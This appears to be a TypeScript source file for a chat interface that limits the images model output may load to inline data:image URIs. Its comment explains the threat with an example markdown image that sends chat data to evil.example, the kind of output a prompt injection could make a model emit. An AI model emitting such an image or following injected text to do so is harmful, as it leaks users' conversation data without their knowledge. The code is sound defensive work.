/**
 * Image sources that model output (markdown and widget payloads) may load.
 *
 * Only inline `data:image/` URIs. A remote image loads as soon as the reply
 * renders, so a prompt injection could make the model emit
 * `![](https://evil.example/?d=<chat data>)` and leak data without a click.
 * Same-origin images (attachments, coding screenshots) come in as path-relative
 * URLs, which streamdown allows on its own.
 */
export const ALLOWED_IMAGE_PREFIXES = ['data:image/'];

/** `v` if it is an inline data:image URI, else null. */
export function inlineImageUrl(v: unknown): string | null {
	if (typeof v !== 'string') return null;
	const s = v.trim();
	return /^data:image\//i.test(s) ? s : null;
}
